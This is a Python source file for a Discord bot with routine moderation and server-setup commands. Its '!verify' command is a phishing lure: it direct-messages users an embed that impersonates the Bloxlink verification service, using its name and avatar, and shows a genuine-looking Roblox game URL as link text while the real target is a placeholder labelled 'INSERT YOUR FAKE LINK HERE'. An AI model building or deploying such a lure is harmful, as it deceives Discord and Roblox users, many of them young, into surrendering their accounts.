import discord
import datetime
from discord.ext import commands
import asyncio

TOKEN = 'YOUR BOT TOKEN HERE'
prefix = '!'

intents = discord.Intents.default()
intents.members = True

client = commands.Bot(command_prefix=prefix, intents=intents)
client.remove_command('help')

@client.event
async def on_ready():
    print('Bot is ready.')

@client.event
async def on_member_join(member):
    # Welcome message
    channel = discord.utils.get(member.guild.channels, name='welcome')
    if channel:
        await channel.send(f"Welcome to the server, {member.mention}!")

@client.command()
async def verify(ctx):
    author = ctx.message.author

    test_e = discord.Embed(colour=discord.Colour(0xff6464))
    test_e.set_author(name="You must be new!")
    test_e.add_field(name="Please verify your account with Bloxlink by joining this game!",
                     value="[https://www.roblox.com/games/3918221347/Bloxlink-Verification-Game?privateServerLinkCode=537609936925](INSERT YOUR FAKE LINK HERE)",
                     inline=False)
    test_e.set_footer(icon_url="https://cdn.discordapp.com/avatars/865378528887308318/78776d34d943cc8c1501ae365f017c1c.png?size=128",
                      text="Bloxlink")
    test_e.set_image(
        url="https://images-ext-2.discordapp.net/external/KHgnlQrg5kVthDcnpe1wcYzkYplbF_e1WQwlQS58XbY/https/t2.rbxcdn.com/73def03f458ec62be70418f8e9a35da5?width=400&height=225")
    test_e.timestamp = datetime.datetime.utcnow()

    draw = discord.Embed(colour=discord.Colour(0xff6464))
    draw.add_field(name="Verification", value=f'I have sent you a link to verify in your direct messages {ctx.author.mention}',
                   inline=False)

    await author.send(embed=test_e)
    await ctx.send(embed=draw)


@client.command()
@commands.is_owner()
async def make_server(ctx):
    guild = ctx.guild
    owner = ctx.author

    # Create channels
    categories = ['General', 'Announcements', 'Moderation', 'Bot Commands']
    for category in categories:
        await guild.create_category(category)

    channels = {
        'general': discord.utils.get(guild.categories, name='General'),
        'announcements': discord.utils.get(guild.categories, name='Announcements'),
        'moderation': discord.utils.get(guild.categories, name='Moderation'),
        'bot_commands': discord.utils.get(guild.categories, name='Bot Commands'),
    }

    for channel in channels.values():
        await channel.create_text_channel('chat')
        await channel.create_voice_channel('voice')

    # Create roles
    roles = {
        'Moderator': discord.Permissions(manage_channels=True, kick_members=True, ban_members=True),
        'Member': discord.Permissions(send_messages=True, read_messages=True),
    }

    for role_name, permissions in roles.items():
        await guild.create_role(name=role_name, permissions=permissions)

    moderator_role = discord.utils.get(guild.roles, name='Moderator')
    await owner.add_roles(moderator_role)

    # Set up rules channel
    rules_channel = discord.utils.get(guild.categories, name='General').channels[0]
    await rules_channel.send("Welcome to the server! Please read the rules below:")

    rules = [
        "Be respectful to others.",
        "No spamming or excessive advertising.",
        "Keep discussions on-topic.",
        "No NSFW or explicit content.",
    ]

    for rule in rules:
        await rules_channel.send(rule)

    # Restrict sending messages in rules channel to moderators only
    await rules_channel.set_permissions(moderator_role, send_messages=True)

    # Set up announcements channel
    announcements_channel = discord.utils.get(guild.categories, name='Announcements').channels[0]
    await announcements_channel.send("Welcome to our server! Stay tuned for important announcements.")

    await ctx.send("Server setup completed successfully!")


@client.command()
@commands.has_permissions(kick_members=True)
async def kick(ctx, member: discord.Member, *, reason=None):
    await member.kick(reason=reason)
    await ctx.send(f"{member.mention} has been kicked from the server.")


@client.command()
@commands.has_permissions(ban_members=True)
async def ban(ctx, member: discord.Member, *, reason=None):
    await member.ban(reason=reason)
    await ctx.send(f"{member.mention} has been banned from the server.")


@client.command()
@commands.has_permissions(manage_messages=True)
async def purge(ctx, amount: int):
    await ctx.channel.purge(limit=amount + 1)
    await ctx.send(f"{amount} messages have been deleted.")


@client.command()
async def ping(ctx):
    await ctx.send("Pong!")


@client.command()
async def say(ctx, *, message):
    await ctx.send(message)


client.run(TOKEN)
#Note this bot can have some issues. 
